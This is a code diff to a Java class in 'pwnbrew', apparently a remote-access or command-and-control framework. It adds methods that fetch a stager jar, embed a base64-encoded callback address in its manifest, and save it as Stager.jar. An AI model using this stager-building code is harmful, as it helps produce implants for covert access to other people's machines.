@@ -39,19 +39,25 @@ package pwnbrew.functions;
 
 import java.io.File;
 import java.io.IOException;
+import java.nio.file.Files;
+import java.nio.file.StandardCopyOption;
 import java.util.HashMap;
 import java.util.Map;
+import java.util.logging.Level;
+import java.util.logging.Logger;
+import javax.swing.JFileChooser;
 import pwnbrew.MaltegoStub;
 import pwnbrew.StubConfig;
 import pwnbrew.log.LoggableException;
 import pwnbrew.misc.Constants;
 import pwnbrew.misc.DebugPrinter;
-import pwnbrew.misc.SocketUtilities;
+import pwnbrew.misc.Utilities;
 import pwnbrew.network.ClientPortRouter;
 import pwnbrew.network.control.ControlMessageManager;
 import pwnbrew.network.control.messages.AddToJarLibrary;
 import pwnbrew.network.control.messages.ControlMessage;
 import pwnbrew.network.control.messages.DeleteJarItem;
+import pwnbrew.network.control.messages.GetJarItemFile;
 import pwnbrew.network.control.messages.GetJarItems;
 import pwnbrew.network.control.messages.GetNetworkSettings;
 import pwnbrew.network.control.messages.ImportCert;
@@ -61,6 +67,7 @@ import pwnbrew.options.OptionsJFrame;
 import pwnbrew.options.OptionsJFrameListener;
 import pwnbrew.options.panels.JarLibraryPanel;
 import pwnbrew.options.panels.NetworkOptionsPanel;
+import pwnbrew.utilities.SocketUtilities;
 import pwnbrew.xml.maltego.MaltegoTransformExceptionMessage;
 
 /**
@@ -368,7 +375,9 @@ public class ToServerConfiguration extends Function implements OptionsJFrameList
             int taskId = SocketUtilities.getNextId();
             
             //Add to the map
-            taskIdToStringMap.put(taskId, selVal);
+            synchronized(taskIdToStringMap){
+                taskIdToStringMap.put(taskId, selVal);
+            }
 
             //Queue the file to be sent
             
@@ -391,7 +400,10 @@ public class ToServerConfiguration extends Function implements OptionsJFrameList
      */
     public void fileSent(String hashFilenameStr, int taskId) {
         //Get the type
-        String tempStr = taskIdToStringMap.remove(taskId);
+        String tempStr;
+        synchronized( taskIdToStringMap){
+            tempStr = taskIdToStringMap.remove(taskId);
+        }
         if( tempStr != null ){
             
             try {
@@ -450,7 +462,9 @@ public class ToServerConfiguration extends Function implements OptionsJFrameList
             int taskId = SocketUtilities.getNextId();
             
             //Add to the map
-            taskIdToStringMap.put(taskId, string);
+            synchronized( taskIdToStringMap){
+                taskIdToStringMap.put(taskId, string);
+            }
 
             //Queue the file to be sent            
             String fileHashNameStr = new StringBuilder().append("0").append(":").append(userSelectedFile.getAbsolutePath()).toString();
@@ -462,6 +476,123 @@ public class ToServerConfiguration extends Function implements OptionsJFrameList
         } catch (IOException ex) {
             DebugPrinter.printMessage( NAME_Class, "sendJarFile", ex.getMessage(), ex );
         }
+    }
+
+    //========================================================================
+    /**
+     * 
+     * @param connectStr 
+     * @param passedName 
+     * @param passedType 
+     * @param passedJvmVersion 
+     * @param passedJarVersion 
+     */
+    @Override
+    public void getStagerFile(String connectStr, String passedName, String passedType, String passedJvmVersion, String passedJarVersion) {
+        try {
+            
+            ControlMessageManager aCMManager = ControlMessageManager.getControlMessageManager();
+            if( aCMManager == null )
+                aCMManager = ControlMessageManager.initialize( theManager );            
+            
+            int taskId = SocketUtilities.getNextId();
+            
+            //Add to the map
+            synchronized( taskIdToStringMap){
+                taskIdToStringMap.put(taskId, connectStr);
+            }
+
+            //Queue the file to be sent            
+            GetJarItemFile getStagerMsg = new GetJarItemFile( taskId, Constants.SERVER_ID, passedName, passedType, passedJvmVersion, passedJarVersion );
+
+            //Send the message
+            aCMManager.send( getStagerMsg );  
+            
+        } catch (IOException ex) {
+            DebugPrinter.printMessage( NAME_Class, "sendJarFile", ex.getMessage(), ex );
+        }
+    }
+    
+    //===============================================================
+    /**
+     * 
+     * @param taskId
+     * @param fileLoc 
+     */
+    @Override
+    public void fileReceived(int taskId, File fileLoc) { 
+        //Add to the map
+        String connectStr;
+        synchronized( taskIdToStringMap){
+            connectStr = taskIdToStringMap.remove(taskId );
+        }
+        
+        //If it exists then update the value
+        if( fileLoc.exists() ){   
+            
+            sun.misc.BASE64Encoder anEncoder = new sun.misc.BASE64Encoder();
+            String encodedStr = anEncoder.encodeBuffer(connectStr.getBytes());
+            if(encodedStr.contains("=")){
+                connectStr += " ";
+                encodedStr = anEncoder.encodeBuffer(connectStr.getBytes());
+                if(encodedStr.contains("=")){
+                    connectStr += " ";
+                    encodedStr = anEncoder.encodeBuffer(connectStr.getBytes());
+                }
+            }
+            
+            //Add the properties that need to be updated
+            Map<String, String> propMap = new HashMap<>();
+            String propLabel = Constants.STAGER_URL;  
+            propMap.put(propLabel, encodedStr);
+            
+            //Update the jar
+            Utilities.updateJarProperties(fileLoc, Constants.MANIFEST_FILE, propMap); 
+            
+            //Open a filechooser and save it to disk
+            File aFile = new File("Stager.jar");
+            File saveFile = getFilePath( aFile );
+            try {
+                Files.move(fileLoc.toPath(), saveFile.toPath(), StandardCopyOption.REPLACE_EXISTING);                
+            } catch (IOException ex) {
+                DebugPrinter.printMessage( NAME_Class, "fileReceived", ex.getMessage(), ex );
+            }
+        }
+    }
+    
+     // ==========================================================================
+    /**
+    * Selects the keystore path via a {@link JFileChooser}.
+    */
+    private File getFilePath( File initialFile ) {
+
+        JFileChooser theCertificateChooser = new JFileChooser();
+        theCertificateChooser.setMultiSelectionEnabled(false);
+        
+        File userSelectedFile = null;
+        theCertificateChooser.setSelectedFile( initialFile );
+        int returnVal = theCertificateChooser.showSaveDialog(null); //Show the dialogue
+        switch( returnVal ) {
+
+           case JFileChooser.CANCEL_OPTION: //If the user canceled the selecting...
+              return null;
+           case JFileChooser.ERROR_OPTION: //If the dialogue was dismissed or an error occurred...
+              return null; //Do nothing
+
+           case JFileChooser.APPROVE_OPTION: //If the user approved the selection...
+              userSelectedFile = theCertificateChooser.getSelectedFile(); //Get the files the user selected
+              break;
+           default:
+              return null;
+
+        }
+
+        //Check if the returned file is valid
+        if(userSelectedFile == null  || userSelectedFile.isDirectory())
+            return null;
+
+        return userSelectedFile;
+
     }
 
 }
